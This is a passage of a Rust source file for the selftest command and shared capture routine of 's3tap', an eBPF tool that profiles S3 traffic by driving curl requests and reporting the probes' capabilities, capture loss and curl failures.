// crates/s3tap-cli/src/selftest.rs
//
// `s3tap selftest`: the fast answer to "does s3tap even work
// on this kernel/arch?". It loads the probes, drives a handful of real S3-shaped
// requests through curl (so the full DNS → TCP → TLS → SSL_write/read path runs),
// and asserts each capability produced a well-formed record. Prints a pass/fail
// table and exits non-zero on any failed capability.
//
// The profiler core stays a passive observer — this only puts a tiny curl driver in
// FRONT of the same load/fold path used by `run` (no load-generation in the probes).

use std::sync::atomic::{AtomicBool, Ordering};
use std::sync::Arc;
use std::time::Duration;

use anyhow::Context;
use aya::{include_bytes_aligned, maps::RingBuf};
use s3tap_core::Correlator;
use s3tap_schema::{Connection, Operation};
use tokio::io::unix::AsyncFd;

use crate::filter::FilterSpec;
use crate::{fold, load_and_attach, Record, EVENTS_MAP, TLS_EVENTS_MAP};
use crate::SelftestArgs;

/// One capability's outcome: Some(detail) ⇒ PASS, None ⇒ FAIL.
struct Caps {
    dns: Option<String>,
    tcp: Option<String>,
    tls: Option<String>,
    http: Option<String>,
}

pub(crate) async fn run(args: &SelftestArgs) -> anyhow::Result<()> {
    check_curl("selftest")?;
    let endpoint = normalize_endpoint(&args.endpoint);
    let host = host_of(&endpoint);
    let local = is_local(&host);
    enote!(
        "s3tap selftest: probing {endpoint} ({} request(s){}) — needs network + curl(OpenSSL)…",
        args.requests,
        if local { ", local endpoint" } else { "" },
    );

    // selftest stops the instant the full path (TLS + HTTP) is proven, so a fast host
    // doesn't idle to the deadline; the curl-cycling driver covers all head shapes.
    let captured = capture_workload(
        !local,
        Duration::from_secs(15),
        Workload::Cycling { endpoint, requests: args.requests },
        Vec::new(), // selftest is a capability check — no bucket/key resolution needed
        |conns, ops| {
            let caps = assess(conns, ops);
            caps.tls.is_some() && caps.http.is_some()
        },
    )
    .await
    .map_err(|e| capture_error("selftest", e))?;

    // Say what went wrong with the CAPTURE before judging what it contains: a workload
    // that never completed a request, or a run that lost events to a full ring, produces
    // exactly the same empty table as a broken probe.
    for line in capture_warnings(&captured) {
        enote!("s3tap: {line}");
    }
    let caps = assess(&captured.conns, &captured.ops);
    // a broken pipe here surfaces as Err -> main's clean exit
    report(&host, local, &caps, captured.uprobes)?;
    if verdict_ok(&caps) {
        Ok(())
    } else {
        anyhow::bail!("selftest: one or more capabilities FAILED (see table)")
    }
}

/// Bail with a clear message if curl is absent rather than letting every capability
/// FAIL with a buried "No such file". `who` names the caller (selftest / --live).
pub(crate) fn check_curl(who: &str) -> anyhow::Result<()> {
    let curl = curl_command().map_err(|e| anyhow::anyhow!("{who}: {e}"))?;
    if curl_version_probe(curl).is_err() {
        anyhow::bail!("{who} needs `curl` to drive traffic, but it could not be run");
    }
    Ok(())
}

/// Run `<curl> --version` purely to prove the program executes.
fn curl_version_probe(mut curl: std::process::Command) -> std::io::Result<std::process::ExitStatus> {
    curl.arg("--version").stdout(std::process::Stdio::null()).status()
}

/// The curl this process is willing to execute: an ABSOLUTE path from the trusted system
/// directories, never a PATH lookup.
///
/// s3tap routinely runs with file capabilities (`sudo s3tap setup`), and a capability-holding
/// process inherits the caller's `PATH` untouched: glibc's AT_SECURE scrub covers the `LD_*`
/// family only. Resolving `curl` through PATH therefore let any local user point this
/// privileged process at a program of their choosing, which is then handed the SigV4 `-K`
/// config (access key AND secret) on stdin. See `elevate::helper_path` for the policy.
fn curl_command() -> std::io::Result<std::process::Command> {
    crate::elevate::helper_path("curl")
        .map(std::process::Command::new)
        .map_err(|reason| std::io::Error::new(std::io::ErrorKind::NotFound, reason))
}

/// The records a [`capture_workload`] run collected, plus the facts a caller needs in
/// order to judge whether those records are worth judging at all.
///
/// `conns`/`ops` alone cannot distinguish a healthy quiet run from a run in which every
/// request failed, half the events were dropped by a full kernel ring, or the L7 probes
/// were never attached. Each extra field below closes one of those confusions, so a
/// verdict built from this struct can say WHY it is thin instead of blaming the operator's
/// capabilities by default. [`capture_warnings`] renders the standard operator-facing
/// lines for all of them.
///
/// `Default` is the benign shape (driver never ran, no loss, uprobes attached), so a test
/// that only cares about records can write `Captured { conns, ops, ..Default::default() }`.
#[derive(Default)]
pub(crate) struct Captured {
    pub conns: Vec<Connection>,
    pub ops: Vec<Operation>,
    /// How the curl driver ended: how many invocations completed, how many exited 0 and
    /// on which exit codes the rest died. Empty records with
    /// `driver.never_completed_a_request()` set mean the workload failed, NOT that the
    /// target was quiet.
    pub driver: DriverOutcome,
    /// What the capture lost: kernel ring-buffer-full drops plus records this build could
    /// not decode. Non-zero means the record set is INCOMPLETE and any rate/percentile
    /// drawn from it is over a population missing exactly the events a full ring shed.
    pub loss: CaptureLoss,
    /// Whether the OpenSSL plaintext uprobes are attached. Decides whether "no L7 rows"
    /// means "no privileges" or "this client does not use OpenSSL".
    pub uprobes: UprobeStatus,
    /// True when the run stopped on its own time budget with the driver still issuing
    /// requests, so fewer than [`Captured::planned_requests`] requests were ever made.
    /// (An early stop because `stop_when` was satisfied is NOT truncation.)
    pub truncated: bool,
    /// How many requests the workload intended to issue in total, across all parallel
    /// workers. The denominator for "captured N of the M requested requests".
    pub planned_requests: u32,
    /// True when the run ended on SIGINT/SIGTERM rather than on its own terms. What was
    /// captured up to that point is still folded and returned (the operator asked to stop,
    /// not to discard), so every verdict drawn from it describes a partial workload.
    pub interrupted: bool,
}

/// How the curl driver ended. `capture_workload` cannot judge the traffic itself (a 403
/// probe is a fully exercised path for `selftest` but a real finding for `doctor --live`),
/// so it reports the raw tally and lets each caller decide.
///
/// These are curl's own PROCESS exit codes, i.e. TRANSPORT outcomes: DNS, connect, TLS,
/// timeout. The driver does not pass `-f`, so an HTTP 403/404 still exits 0. Judge HTTP
/// status from the captured operations, never from this.
#[derive(Debug, Default, Clone, PartialEq, Eq)]
pub(crate) struct DriverOutcome {
    /// curl invocations that ran to completion on their own (not killed by the stop
    /// deadline). Zero with `killed > 0` means every worker was still running when the
    /// budget ran out.
    pub finished: u32,
    /// Of `finished`, how many exited 0.
    pub succeeded: u32,
    /// Every distinct non-zero exit status seen, with how many invocations ended on it,
    /// most frequent first. A negative value is `-signal` (a curl killed by a signal has
    /// no exit code). Empty when every finished invocation exited 0.
    pub exit_codes: Vec<(i32, u32)>,
    /// Invocations killed before they finished: the capture's deadline, or the observer's
    /// early stop once it had its answer. Not a failure.
    pub killed: u32,
    /// The driver itself could not run (spawn/poll error, or the blocking task panicked).
    /// Nothing was driven, so an empty capture says nothing about the target.
    pub error: Option<String>,
}

impl DriverOutcome {
    /// `Some((exit_code, invocations))` when the driver ran invocations to completion and
    /// NOT ONE of them exited 0. The workload never completed a request, so the capture
    /// describes that failure rather than the target: a caller must not read the resulting
    /// empty/thin record set as health. `exit_code` is the most common one, so the caller
    /// can name what it means (see [`curl_exit_meaning`]).
    ///
    /// Deliberately all-or-nothing. A partial failure rate is a real finding about the
    /// target and belongs in the report, not in a "the capture is void" gate.
    pub fn never_completed_a_request(&self) -> Option<(i32, u32)> {
        if self.finished == 0 || self.succeeded > 0 {
            return None;
        }
        self.exit_codes.first().map(|&(code, _)| (code, self.finished))
    }

    /// Fold one finished child into the tally.
    fn record(&mut self, status: std::process::ExitStatus) {
        self.finished += 1;
        if status.success() {
            self.succeeded += 1;
            return;
        }
        // A signalled child has no exit code: report `-signal` so the caller still gets a
        // distinguishable value instead of a silent 0 that would read as success.
        let code = status.code().unwrap_or_else(|| {
            use std::os::unix::process::ExitStatusExt;
            -status.signal().unwrap_or(0)
        });
        match self.exit_codes.iter_mut().find(|(c, _)| *c == code) {
            Some((_, n)) => *n += 1,
            None => self.exit_codes.push((code, 1)),
        }
    }

    /// Order `exit_codes` most-frequent-first (ties by code, so the output is stable and
    /// testable) once the driver is done. Called on every return path.
    fn sealed(mut self) -> Self {
        self.exit_codes.sort_by(|a, b| b.1.cmp(&a.1).then(a.0.cmp(&b.0)));
        self
    }
}

/// What curl's exit code means, so a report can name the failure rather than print a bare
/// number. Only the codes a driven S3 request realistically produces are spelled out.
/// From curl(1)'s EXIT CODES section.
pub(crate) fn curl_exit_meaning(code: i32) -> &'static str {
    match code {
        1 => "unsupported protocol",
        2 => "failed to initialize",
        3 => "malformed URL",
        5 => "could not resolve proxy",
        6 => "could not resolve host",
        7 => "could not connect",
        22 => "HTTP error returned",
        28 => "operation timed out",
        35 => "TLS handshake failed",
        47 => "too many redirects",
        52 => "empty reply from server",
        55 => "send failure",
        56 => "receive failure",
        60 => "server certificate not trusted",
        77 => "could not read the CA bundle",
        c if c < 0 => "killed by a signal",
        _ => "see curl(1) EXIT CODES",
    }
}

/// What a capture LOST. Mirrors the four kernel drop slots `run` reports plus the decode
/// tally, so a lossy run here cannot masquerade as a quiet network either.
#[derive(Debug, Default, Clone, Copy, PartialEq, Eq)]
pub(crate) struct CaptureLoss {
    /// Records the kernel delivered that THIS build could not decode: an ABI skew with
    /// `bpf/include/s3tap_events.h`, or an event type this agent does not handle.
    pub undecoded: u64,
    /// Slot 0, the critical `events` ring: connect/close/DNS/SNI the kernel never
    /// delivered because the ring was full. Strips whole connections or their DNS/region.
    pub crit_drops: u64,
    /// Slot 1, the isolated `tls_events` ring: lost TLS plaintext, so lost L7 operations.
    pub tls_drops: u64,
    /// Slot 2, process-exec notifications (scope enrollment).
    pub proc_drops: u64,
    /// Slot 3, in-flight TCP samples.
    pub sample_drops: u64,
}

impl CaptureLoss {
    /// Any loss at all means the record set is a SAMPLE of the workload, not the whole of
    /// it. A caller must mark its verdict incomplete rather than present a rate or a
    /// percentile as final: a full ring sheds events under load, which is exactly when the
    /// slow operations happen.
    pub fn incomplete(&self) -> bool {
        self.undecoded > 0
            || self.crit_drops > 0
            || self.tls_drops > 0
            || self.proc_drops > 0
            || self.sample_drops > 0
    }
}

/// Whether the OpenSSL plaintext uprobes are actually watching. Without them there is no
/// L7 row at all, so "no operations captured" has two very different causes and only this
/// tells them apart.
#[derive(Debug, Default, Clone, Copy, PartialEq, Eq)]
pub(crate) enum UprobeStatus {
    /// Every required SSL_* probe loaded AND attached to libssl. A capture with no L7 row
    /// is then a fact about the CLIENT, not about privileges: Go's crypto/tls, rustls and
    /// a statically linked BoringSSL export no SSL_* symbols, so there is nothing to
    /// attach to and no plaintext to see.
    #[default]
    Attached,
    /// The probes are not in place, so no L7 row can exist whatever the traffic was.
    /// `permission` is true when this process lacks cap_sys_admin, which is the usual
    /// cause and the only one with a one-line fix (`sudo s3tap setup --uprobes`). When it
    /// is false the cause is something else (no libssl on the host, a verifier reject) and
    /// `load_and_attach` already printed it.
    Unattached { permission: bool },
}

/// The required OpenSSL uprobe programs, in the order `attach_openssl` (main.rs) works
/// through them. Pinned against that source by a test below, since the coupling is by
/// convention only.
const OPENSSL_PROGS: [&str; 5] = [
    "handle_ssl_free",
    "handle_ssl_set_fd",
    "handle_ssl_write",
    "handle_ssl_read_exit",
    "handle_ssl_read_entry",
];

/// Recover whether the OpenSSL uprobes attached, from the loaded program set.
///
/// `load_and_attach` swallows an `attach_openssl` failure into a warning (correct: the
/// connection floor is still worth capturing) and does not return the fact, so we infer it
/// here instead of changing that signature. `attach_openssl` loads each program then
/// attaches it and RETURNS at the first program that attached no symbol, so the programs
/// after a failure are never loaded. All five loaded therefore means all five attached.
/// (The one shape that would fool this is the LAST program loading and then failing to
/// attach. It attaches `SSL_read`, the very symbol the program before it just attached
/// successfully, so that combination does not occur.)
fn uprobe_status(bpf: &aya::Ebpf) -> UprobeStatus {
    let all_loaded = OPENSSL_PROGS
        .iter()
        .all(|name| bpf.program(name).is_some_and(|p| p.fd().is_ok()));
    if all_loaded {
        UprobeStatus::Attached
    } else {
        UprobeStatus::Unattached { permission: !crate::elevate::holds_uprobe_caps() }
    }
}

/// A capture that could not start for a reason [`capture_error`] must NOT re-diagnose: the
/// cause is already known exactly and is not "your probes failed to load". Two of them
/// exist, and both used to be reported as a probe/permission problem the operator would
/// then chase with `s3tap setup`: no OS entropy source for the correlator's key-hash salt,
/// and a kernel that will not give us the `sched_process_fork` tracepoint this pid-scoped
/// capture is built on. Carried as a type so the message survives the wrapping intact.
#[derive(Debug)]
pub(crate) struct CaptureSetupError(String);

impl std::fmt::Display for CaptureSetupError {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        f.write_str(&self.0)
    }
}

impl std::error::Error for CaptureSetupError {}

/// What a pid-scoped capture loses without `sched_process_fork`, spelled out because the
/// symptom (every capability FAIL) points at the probes and the cause does not.
///
/// `capture_workload` scopes to its OWN tgid and spawns curl as a child, so enrollment
/// happens entirely through in-kernel fork propagation: with `apps`/`exes` empty nothing
/// else can ever enroll the child. `load_and_attach` attaches that tracepoint best-effort
/// and warns about `--app`/`--exe` and pre-fork workers, which are flags this path does not
/// use, so the operator was told the one thing that was irrelevant.
const NO_FORK_TRACKING: &str = "this run scopes the capture by pid and needs the \
     sched_process_fork tracepoint, which this kernel did not give us (the load warning \
     above names the underlying error). Without it the curl workload s3tap spawns is never \
     enrolled in the capture scope, so every capability would report FAIL for a reason that \
     has nothing to do with your probes or your capabilities. It is a BTF tracepoint, so it \
     needs kernel BTF at /sys/kernel/btf/vmlinux (CONFIG_DEBUG_INFO_BTF=y) and an LSM or \
     seccomp policy that permits BPF_RAW_TRACEPOINT_OPEN.";

/// The error shown when the capture could not START, discriminating on what actually
/// failed. The old text blamed capabilities unconditionally and pointed at
/// `UPROBES=1 ./setcap.sh`, a repo script an operator who installed a release binary does
/// not have. A too-old kernel or an absent BTF blob is a different problem with a
/// different fix, so do not assert a cause that was never checked. `who` names the caller
/// (selftest / --live).
pub(crate) fn capture_error(who: &str, e: anyhow::Error) -> anyhow::Error {
    // A cause we established ourselves passes through: re-diagnosing it as a load failure
    // would send the operator to `s3tap setup` for a kernel config or an entropy problem.
    if let Some(known) = e.downcast_ref::<CaptureSetupError>() {
        return anyhow::anyhow!("{who}: {known}");
    }
    if crate::is_permission_error(&e) {
        anyhow::anyhow!(
            "{who} could not load its probes: permission denied. Grant the capabilities \
             once with `sudo s3tap setup --uprobes`, or run under sudo. (underlying \
             error: {e:#})"
        )
    } else {
        anyhow::anyhow!(
            "{who} could not load its probes (underlying error: {e:#}). This is not a \
             permissions failure, so capabilities will not fix it. s3tap needs Linux 5.8 \
             or newer with kernel BTF at /sys/kernel/btf/vmlinux."
        )
    }
}

/// The operator-facing lines a [`Captured`] owes its report, most serious first: the
/// workload failing outright, a truncated run, then each loss channel. Returned as lines
/// rather than printed so every caller can place them (stderr, a report section) and so
/// the wording is unit-testable. The caller prefixes them (`s3tap: {line}`).
pub(crate) fn capture_warnings(c: &Captured) -> Vec<String> {
    let mut out = Vec::new();
    if let Some(err) = &c.driver.error {
        out.push(format!(
            "WARNING: the traffic driver could not run ({err}). Nothing was driven, so \
             this capture says nothing about the target."
        ));
    }
    if let Some((code, n)) = c.driver.never_completed_a_request() {
        out.push(format!(
            "WARNING: the workload never completed a request. curl exited {code} ({}) on \
             all {n} worker(s), so this capture describes that failure rather than the \
             target's health.",
            curl_exit_meaning(code)
        ));
    }
    if c.interrupted {
        out.push(format!(
            "note: the run was interrupted. It captured {} of the {} requested request(s), \
             so every number below describes that partial workload.",
            c.ops.len(),
            c.planned_requests
        ));
    }
    if c.truncated {
        out.push(format!(
            "note: the run hit its time budget with the driver still going. It captured \
             {} of the {} requested request(s). Raise --timeout-secs for the full sample.",
            c.ops.len(),
            c.planned_requests
        ));
    }
    // The same four drop slots (and the same reasoning) `run` reports, so a lossy capture
    // here cannot masquerade as a quiet network either. Lead with the headline: the detail
    // lines say WHAT was lost, and this says what that means for the verdict below them.
    if c.loss.incomplete() {
        out.push(
            "WARNING: this capture is INCOMPLETE. Every rate and percentile below is drawn \
             from a population missing exactly the events a full ring sheds, which is under \
             load, which is when the slow operations happen."
                .to_string(),
        );
    }
    if c.loss.undecoded > 0 {
        out.push(format!(
            "WARNING: {} undecodable ring-buffer record(s), from a probe/agent ABI \
             mismatch or an unhandled event type. The capture is incomplete.",
            c.loss.undecoded
        ));
    }
    if c.loss.crit_drops > 0 {
        out.push(format!(
            "WARNING: the kernel dropped {} critical event(s) with the ring buffer full. \
             Whole connections (or their DNS/region) are missing, so the verdict below is \
             drawn from a partial capture.",
            c.loss.crit_drops
        ));
    }
    if c.loss.tls_drops > 0 {
        out.push(format!(
            "WARNING: the kernel dropped {} TLS-plaintext event(s) with the ring buffer \
             full, so operations are MISSING from the set judged below. Lower \
             --concurrency or --requests for a complete sample.",
            c.loss.tls_drops
        ));
    }
    if c.loss.proc_drops > 0 {
        out.push(format!(
            "note: dropped {} process-exec notification(s) under load. A forked worker may \
             have been missed by the capture scope.",
            c.loss.proc_drops
        ));
    }
    if c.loss.sample_drops > 0 {
        out.push(format!(
            "note: dropped {} in-flight TCP sample(s) under load. No connection, DNS or \
             SNI data was lost.",
            c.loss.sample_drops
        ));
    }
    out
}

/// SigV4 credentials for an authenticated `--live` workload. The
/// secret never reaches argv — it's fed to curl via a `-K -` config on stdin.
pub(crate) struct AwsCreds {
    pub access_key: String,
    pub secret_key: String,
    pub session_token: Option<String>,
    pub region: String,
}

/// What the curl driver issues. The two consumers want different traffic shapes:
pub(crate) enum Workload {
    /// `selftest`: cycle GET `/` / HEAD `/` / GET `…/probe`, ONE curl process per request
    /// — exercises every head shape (a 404 probe is fine; selftest only proves the path).
    Cycling {
        endpoint: String,
        requests: u32,
    },
    /// `doctor --live`: N keep-alive HTTP/1.1 GETs over ONE curl invocation — so a healthy
    /// target is all-2xx with real connection reuse, which the doctor can judge green.
    /// With one `endpoint` every request hits it (warm/steady-state).
    /// With `rotate` + several `endpoints` the requests cycle through them one-per-request, so
    /// each fetch is a distinct object (cold-fetch — defeats per-object caching). `auth`
    /// SigV4-signs each request so a private bucket returns 2xx.
    KeepAlive {
        endpoints: Vec<String>,
        requests: u32,
        rotate: bool,
        /// Parallel curl workers (each its own connection). 1 = serial keep-alive.
        concurrency: u32,
        auth: Option<AwsCreds>,
    },
}

impl Workload {
    /// Total requests this workload intends to issue across all parallel workers. The
    /// denominator for "captured N of the M requested requests" when the budget truncates.
    fn planned_requests(&self) -> u32 {
        match self {
            Workload::Cycling { requests, .. } => *requests,
            Workload::KeepAlive { requests, concurrency, .. } => {
                requests.saturating_mul((*concurrency).max(1))
            }
        }
    }

    fn drive(self, stop: &AtomicBool) -> std::io::Result<DriverOutcome> {
        match self {
            Workload::Cycling { endpoint, requests } => drive_cycling(&endpoint, requests, stop),
            Workload::KeepAlive { endpoints, requests, rotate, concurrency, auth } => {
                drive_keepalive(&endpoints, requests, rotate, concurrency, auth.as_ref(), stop)
            }
        }
    }
}

/// Load the probes (scoped to the driver's own process tree, plaintext on), run `workload`,
/// and drain both rings until `stop_when(conns, ops)` returns true or `timeout` elapses — then
/// cancel the driver and return what was captured. The shared capture core behind
/// `selftest` and `doctor --live`. `capture_workload` owns the
/// driver's whole lifecycle (spawn → cancel-on-stop/timeout → await), not just the drain.
pub(crate) async fn capture_workload(
    drop_loopback: bool,
    timeout: Duration,
    workload: Workload,
    s3_endpoints: Vec<String>,
    stop_when: impl Fn(&[Connection], &[Operation]) -> bool,
) -> anyhow::Result<Captured> {
    let bpf_object = include_bytes_aligned!(concat!(env!("OUT_DIR"), "/s3tap.bpf.o"));
    // Scope to OUR OWN PROCESS TREE, by pid. Scoping by app NAME (`apps: ["curl"]`) was
    // host-wide in disguise: the startup /proc scan enrolls every curl already running and
    // `Filter::on_exec` enrolls every curl that starts later, so a CONCURRENT, unrelated
    // `curl https://other-tenant-bucket/secret` had its decrypted request head captured by
    // the host-wide TLS uprobes below, folded into an Operation (foreign bucket, foreign
    // pid) that skewed the verdict and was written verbatim into the operator's `--save`
    // file. That is another tenant's data in our file. Our own tgid is the only entry: both
    // drivers spawn curl as CHILDREN of this process and the sched_process_fork tracepoint
    // propagates allowlist membership from a tracked parent to its children in-kernel, so
    // exactly the curls we spawn are in scope. With `apps`/`exes` empty the /proc scan has
    // nothing to enroll and `on_exec` can never widen the scope again. Tracking our own
    // tgid costs nothing: s3tap issues no network requests of its own here. If the fork
    // tracepoint can't attach (load_and_attach warns), this captures nothing rather than
    // someone else's plaintext — for a leak, failing closed is the right direction.
    //
    // Built before load so load_and_attach engages the filter before the producer attaches
    // (no out-of-scope leak — round-3 #1).
    let spec = FilterSpec { pids: vec![std::process::id()], ..Default::default() };
    // capture_plaintext: HTTP semantics need the SSL uprobes. drop_loopback off for a
    // local endpoint so a MinIO-on-loopback probe isn't filtered out.
    //
    // aya 0.13 creates maps in a randomized HashMap order (bpf.rs `obj.maps.drain()`), and
    // under missing caps a map-creation failure rarely (~2%, order-dependent) surfaces as a
    // panic inside aya instead of an Err. That panic would escape as exit 101 and break the
    // capture-failure exit-code contract (callers map a capture Err -> the friendly "needs
    // caps" message + exit 3). Catch it here and fold it into the same Err, so "ran
    // --live/selftest without caps" always lands on the hint, never a trace.
    //
    // The silencing hook is process-global, so it is SCOPED TO THIS THREAD by id: a panic on
    // any other thread still prints through the previous hook. The window is not quiet, as an
    // earlier comment here claimed — `probe_regions` (main.rs) keeps a progress-ticker OS
    // thread alive across every one of its ~20 calls. A blanket no-op hook swallowed those
    // panics whole, leaving the operator a frozen progress bar and no diagnosis.
    let (mut bpf, mut filter, fork_tracking) = {
        let prev = Arc::new(std::panic::take_hook());
        let loader = std::thread::current().id();
        let hook_prev = Arc::clone(&prev);
        std::panic::set_hook(Box::new(move |info| {
            if std::thread::current().id() != loader {
                (**hook_prev)(info); // someone else's panic — never swallow it
            }
        }));
        let loaded =
            std::panic::catch_unwind(std::panic::AssertUnwindSafe(|| {
                load_and_attach(bpf_object, drop_loopback, true, None, &spec)
            }));
        // Drop OUR hook first so the Arc is uniquely owned, then put the ORIGINAL box back —
        // otherwise repeated calls (probe_regions sweeps 20 regions) would nest one wrapper
        // closure per call.
        drop(std::panic::take_hook());
        match Arc::try_unwrap(prev) {
            Ok(orig) => std::panic::set_hook(orig),
            // Unreachable (the only other reference was just dropped); re-wrap rather than
            // leave the process on the default hook.
            Err(shared) => std::panic::set_hook(Box::new(move |info| (**shared)(info))),
        }
        match loaded {
            Ok(res) => {
                let l = res?;
                (l.bpf, l.filter, l.fork_tracking)
            }
            Err(payload) => {
                let msg = payload
                    .downcast_ref::<&str>()
                    .map(|s| (*s).to_string())
                    .or_else(|| payload.downcast_ref::<String>().cloned())
                    .unwrap_or_else(|| "eBPF load panicked".to_string());
                anyhow::bail!("failed to load eBPF object: {msg}");
            }
        }
    };

    // The scope above is ONLY viable with fork propagation, so refuse to run a capture that
    // is structurally guaranteed to see nothing. Reporting the cause once beats four FAIL
    // rows the operator would read as "s3tap does not work on this kernel".
    if !fork_tracking {
        return Err(anyhow::Error::new(CaptureSetupError(NO_FORK_TRACKING.to_string())));
    }

    let ring = RingBuf::try_from(bpf.take_map(EVENTS_MAP).context("no events map")?)?;
    let mut events_fd = AsyncFd::new(ring).context("register events ring")?;
    let tls_ring = RingBuf::try_from(bpf.take_map(TLS_EVENTS_MAP).context("no tls_events map")?)?;
    let mut tls_fd = AsyncFd::new(tls_ring).context("register tls ring")?;

    // try_new, never the panicking `new`: the only failure is "no OS entropy source for the
    // per-run key-hash salt", which is a real container shape (no /dev/urandom in the
    // namespace). A panic here lands BELOW the catch_unwind above, whose whole purpose is
    // that a capture failure reaches the operator as a message rather than a backtrace.
    let mut correlator = Correlator::try_new().map_err(|e| {
        anyhow::Error::new(CaptureSetupError(format!("could not start the correlator: {e}")))
    })?;
    // Opt-in non-AWS S3 endpoints (e.g. a Storj/MinIO gateway), so the correlator resolves
    // path-style bucket/key for the per-s3_op rows. Empty for AWS.
    if !s3_endpoints.is_empty() {
        correlator.set_s3_endpoints(s3_endpoints);
    }
    let mut undecoded = 0u64;
    let mut conns: Vec<Connection> = Vec::new();
    let mut ops: Vec<Operation> = Vec::new();

    // Drive curl on a blocking thread after a short delay (so the ALLOWLIST is live).
    // Both drivers honor `stop` the same way: poll it and KILL the in-flight curl child — so
    // setting it on the deadline (below) actually bounds the run, not just curl's per-transfer
    // --max-time.
    let stop = Arc::new(AtomicBool::new(false));
    // `stop` must be set on EVERY exit from this function, not just the normal one. Dropping a
    // `spawn_blocking` JoinHandle does NOT cancel the blocking task, so without this guard:
    //   - a Ctrl-C (or any cancellation) that drops this future left `stop` clear, and the
    //     driver kept spawning fresh curl children for the whole remaining request sequence,
    //     orphaned to init when the process exited;
    //   - a `?` on a ring-poll error returned Err with `stop` clear, and dropping the tokio
    //     runtime then BLOCKS on the still-running blocking task — the process printed its
    //     error and appeared to hang until the driver finished its sequence.
    // Same StopOnDrop shape as `probe_regions` in main.rs. The normal path still stores + awaits
    // explicitly below (this then no-ops).
    struct StopOnDrop(Arc<AtomicBool>);
    impl Drop for StopOnDrop {
        fn drop(&mut self) {
            self.0.store(true, Ordering::Relaxed);
        }
    }
    let _stop_guard = StopOnDrop(Arc::clone(&stop));
    let planned_requests = workload.planned_requests();
    let stop_driver = Arc::clone(&stop);
    let mut driver = tokio::task::spawn_blocking(move || {
        std::thread::sleep(Duration::from_millis(400));
        workload.drive(&stop_driver)
    });

    // A capture is bounded, but it is not short: `--timeout-secs` allows up to an hour, and a
    // `--live --save` run holds a RESERVED (empty, 0600, root-owned) destination file whose
    // name is released by `SaveTarget`'s Drop. Dying on the default SIGINT disposition runs no
    // Drop, so a Ctrl-C left that empty placeholder behind for ever and every later run of the
    // documented recipe was refused by it ("Nothing was captured, so no run was wasted", which
    // was then false). Catching the signal breaks the loop instead: the drain below still runs,
    // this returns normally and the stack unwinds through every Drop.
    let mut sigint = tokio::signal::unix::signal(tokio::signal::unix::SignalKind::interrupt())
        .context("hook SIGINT for the capture")?;
    let mut sigterm = tokio::signal::unix::signal(tokio::signal::unix::SignalKind::terminate())
        .context("hook SIGTERM for the capture")?;

    // Drain until `stop_when` (selftest: path proven; --live: never — drain all ops for the
    // medians/tail), the deadline, or a signal.
    let mut deadline = tokio::time::Instant::now() + timeout;
    let mut driver_result = None;
    let mut truncated = false;
    let mut interrupted = false;
    loop {
        if stop_when(&conns, &ops) {
            break;
        }
        tokio::select! {
            () = tokio::time::sleep_until(deadline) => {
                // Truncation ONLY when the driver was still going: once it has finished the
                // deadline is collapsed to a 500 ms grace, and expiring that is the normal
                // end of a complete run.
                truncated = driver_result.is_none();
                break;
            }
            guard = events_fd.readable_mut() => {
                let mut g = guard.context("events ring poll")?;
                let drained = drain_capture_batch(
                    g.get_inner_mut(), &mut correlator, &mut undecoded, &mut filter, &mut conns, &mut ops,
                );
                if drained {
                    g.clear_ready();
                }
            }
            guard = tls_fd.readable_mut() => {
                let mut g = guard.context("tls ring poll")?;
                let drained = drain_capture_batch(
                    g.get_inner_mut(), &mut correlator, &mut undecoded, &mut filter, &mut conns, &mut ops,
                );
                if drained {
                    g.clear_ready();
                }
            }
            res = &mut driver, if driver_result.is_none() => {
                // Driver finished all requests — collapse the deadline to a short grace
                // (lets a trailing close record, which lands after curl exits, arrive).
                driver_result = Some(res);
                deadline = tokio::time::Instant::now() + Duration::from_millis(500);
            }
            _ = sigint.recv() => {
                enote!("\ns3tap: Ctrl-C received. Stopping the capture and reporting what it holds.");
                interrupted = true;
                break;
            }
            _ = sigterm.recv() => {
                enote!("\ns3tap: SIGTERM received. Stopping the capture and reporting what it holds.");
                interrupted = true;
                break;
            }
        }
    }

    // Cancel the driver: set `stop` — both drivers kill their in-flight curl child and issue
    // no more requests — then take/await its result, which now returns promptly (so the
    // deadline is an actual wall-clock bound).
    stop.store(true, Ordering::Relaxed);
    let outcome = match driver_result {
        Some(r) => r,
        None => driver.await,
    };
    // The driver's own outcome is DATA, not a log line: an empty capture from a workload that
    // never completed a request must not read as "the target was quiet" (see `capture_warnings`).
    let driver = match outcome {
        Ok(Ok(o)) => o,
        Ok(Err(e)) => DriverOutcome { error: Some(e.to_string()), ..Default::default() },
        Err(e) => DriverOutcome { error: Some(e.to_string()), ..Default::default() },
    }
    .sealed();

    // FINAL DRAIN, then FLUSH — the same two load-bearing steps `run` does at shutdown, and
    // for the same reason. The loop above always leaves through a timer or a signal, so
    // whatever the two rings hold at that instant was simply never read. That is not a
    // rounding error in the result: `events` is where EVT_TCP_CLOSE rides, and a close is the
    // ONLY source of srtt_us/min_rtt_us, i.e. the RTT floor every latency verdict is a ratio
    // against. Losing the last closes turns a healthy run into NO BASELINE (exit 2), or judges
    // the TTFBs against a floor drawn from a different subset of connections than the one that
    // produced them. `tls_events` carries the response heads, so the tail of the run's
    // operations never became records at all and the medians described only its earlier part.
    // Chaos is worst hit: the loss falls differently on the baseline and fault windows, which
    // is exactly what its verdict compares.
    //
    // ORDER MATTERS: tls_events FIRST, then events. `on_close` REMOVES the `conns`/`tls` entries
    // that `build_op` reads, so draining a queued close before the response head still sitting
    // in the other ring would tear down the state that head needs.
    //
    // Safe to drain to empty (no batch cap): the driver is stopped and its children are reaped,
    // so nothing is refilling behind us and there is no other select! arm left to starve.
    for ring in [tls_fd.get_mut(), events_fd.get_mut()] {
        while let Some(item) = ring.next() {
            collect(&mut correlator, &item, &mut undecoded, &mut filter, &mut conns, &mut ops);
        }
    }
    // The rings are empty, but the CORRELATOR still holds every request that was in flight when
    // the capture stopped. Without this they vanish, while the identical request that happened
    // to be closed by the peer IS emitted — so "the capture ended here" and "the request never
    // happened" would be indistinguishable in the record set a verdict is drawn from. Once,
    // after the last fold: an earlier call would flush an operation that is still live.
    correlator.flush_open_ops();
    ops.extend(correlator.take_flushed_ops());

    // Read the drop counters BEFORE the Ebpf handle goes out of scope, exactly as `run` does,
    // so a lossy capture cannot masquerade as a quiet network here either.
    let loss = CaptureLoss {
        undecoded,
        crit_drops: crate::ringbuf_drops(&bpf, 0),
        tls_drops: crate::ringbuf_drops(&bpf, 1),
